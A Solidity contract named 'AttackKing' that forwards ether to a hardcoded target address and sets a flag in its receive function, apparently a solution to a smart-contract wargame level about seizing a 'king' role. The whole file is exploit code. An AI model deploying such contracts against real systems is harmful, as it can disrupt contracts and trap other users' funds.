// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing{

    address payable king;
    bool public setupDone;

    constructor() public {
        king = payable(0x95e397c2AED295660218C7fA85649950fAB2A81E);
    }

    function setup() public payable {
        (bool success, bytes memory _) =  king.call.value(msg.value)("");
        require(success == true, "failed to transfer");
    }

    receive() payable external {
        if (setupDone){
            (bool success, bytes memory _) =  king.call.value(msg.value)("");
        } else {
            setupDone = true;
        }
    }
}